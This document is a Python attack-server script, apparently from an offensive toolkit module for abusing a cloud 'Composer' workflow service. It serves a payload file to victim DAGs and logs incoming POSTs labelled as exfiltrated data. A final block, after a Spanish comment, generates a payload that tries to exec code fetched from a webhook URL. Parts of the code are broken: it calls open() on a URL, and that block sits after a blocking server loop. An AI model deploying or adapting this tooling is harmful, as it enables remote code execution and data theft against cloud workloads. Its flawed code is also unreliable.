from http.server import BaseHTTPRequestHandler, HTTPServer
import logging
import os

PAYLOAD_FILE = "payload/payload.py"

class WebhookHandler(BaseHTTPRequestHandler):
    def _set_headers(self, code=200, content_type="text/plain"):
        self.send_response(code)
        self.send_header('Content-type', content_type)
        self.end_headers()

    def do_GET(self):
        if self.path == "/payload.py":
            if os.path.exists(PAYLOAD_FILE):
                with open(PAYLOAD_FILE, 'rb') as f:
                    self._set_headers()
                    self.wfile.write(f.read())
                    print("[✓] Served payload.py to Composer DAG")
            else:
                self._set_headers(404)
                self.wfile.write(b"Not found")
        else:
            self._set_headers(404)
            self.wfile.write(b"Invalid path")

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        print(f"[POST] Exfiltration received: {post_data.decode('utf-8')}")
        self._set_headers()
        self.wfile.write(b"ACK")

def run(server_class=HTTPServer, handler_class=WebhookHandler, port=8080):
    logging.basicConfig(level=logging.INFO)
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"[*] Serving payload on port {port} …")
    httpd.serve_forever()

if __name__ == "__main__":
    run()

    # 🔽 Añadir al final del archivo (fuera del handler, tras run()):
    webhook_url_file = "webhook_url.txt"
    payload_path = "modules/abuse_composer_external_payload/payload/payload.py"

    if os.path.exists(webhook_url_file):
        with open(webhook_url_file, "r") as f:
            webhook_url = f.read().strip()

        os.makedirs(os.path.dirname(payload_path), exist_ok=True)
        with open(payload_path, "w") as f:
            f.write("exec(open('" + webhook_url + "/payload.py').read())")
        print(f"[✓] Generated dynamic payload with webhook: {webhook_url}")
    else:
        print("[!] webhook_url.txt not found. Cannot generate payload.")
